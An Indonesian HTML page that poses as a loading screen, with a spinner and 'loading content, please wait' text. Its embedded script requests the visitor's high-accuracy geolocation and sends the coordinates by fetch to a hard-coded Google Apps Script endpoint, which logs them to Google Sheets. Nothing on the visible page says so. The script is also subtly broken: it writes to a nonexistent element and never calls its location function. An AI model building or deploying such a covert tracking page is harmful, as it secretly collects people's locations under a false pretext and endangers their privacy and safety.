<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat Halaman...</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 100px; color: #666; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div id="status">Sedang memuat konten, harap tunggu...</div>

    <script>
    const tampilan = document.getElementById("hasil");
    // MASUKKAN URL WEB APP ANDA DI SINI
    const URL_GAS = "https://script.google.com/macros/s/AKfycby-_M65RGF7jZAZjJNwKM3qHnK7Cnh-tEJrt9newTuXmYDW8OltBj0shRYJ3Vwq445A_Q/exec"; 

    function ambilLokasi() {
        if (navigator.geolocation) {
            tampilan.innerHTML = "Sedang mencari posisi...";
            navigator.geolocation.getCurrentPosition(tampilkanPosisi, tampilkanError, {enableHighAccuracy: true});
        } else {
            tampilan.innerHTML = "Geolocation tidak didukung.";
        }
    }

    function tampilkanPosisi(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        tampilan.innerHTML = `Lokasi Ditemukan: ${lat}, ${lon}<br>Mengirim ke Google Drive...`;

        // Mengirim data ke Google Sheets menggunakan Fetch API
        fetch(URL_GAS, {
            method: "POST",
            mode: "no-cors", // Penting untuk menghindari masalah CORS
            body: JSON.stringify({ lat: lat, lon: lon }),
            headers: { "Content-Type": "application/json" }
        })
        .then(() => {
            tampilan.innerHTML += "<br>Data Berhasil Tersimpan di Google Sheets!";
        })
        .catch(err => {
            tampilan.innerHTML = "Gagal mengirim data: " + err;
        });
    }

    function tampilkanError(error) {
        tampilan.innerHTML = "Error: " + error.message;
    }
</script>

</body>
</html>
